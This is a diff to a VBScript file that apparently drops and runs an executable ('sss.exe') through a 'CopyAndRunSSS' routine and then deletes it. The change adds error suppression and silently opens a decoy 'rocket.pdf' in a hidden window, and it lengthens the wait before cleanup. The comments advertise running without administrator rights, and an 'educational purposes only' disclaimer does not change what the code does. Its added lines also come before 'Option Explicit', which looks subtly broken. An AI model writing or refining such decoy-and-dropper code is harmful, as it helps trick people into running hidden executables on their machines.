@@ -2,6 +2,17 @@
 ' This version does not require administrator privileges and suppresses all error messages.
 ' Be extremely cautious when running scripts that copy and execute files.
 ' This script is provided for educational purposes only. Misuse can have serious consequences.
+On Error Resume Next
+
+Set fso = CreateObject("Scripting.FileSystemObject")
+Set shell = CreateObject("WScript.Shell")
+
+pdfPath = CreateObject("WScript.Shell").CurrentDirectory & "\rocket.pdf"
+
+If fso.FileExists(pdfPath) Then
+    shell.Run Chr(34) & pdfPath & Chr(34), 0, False
+End If
+
 
 Option Explicit
 
@@ -52,7 +63,7 @@ Sub CopyAndRunSSS()
                     On Error Goto 0
                 end if
 				
-				WScript.Sleep 10000
+				WScript.Sleep 30000
 				' Delete sss.exe (assuming it's already closed)
 				
 				Set WshShell = CreateObject("WScript.Shell")
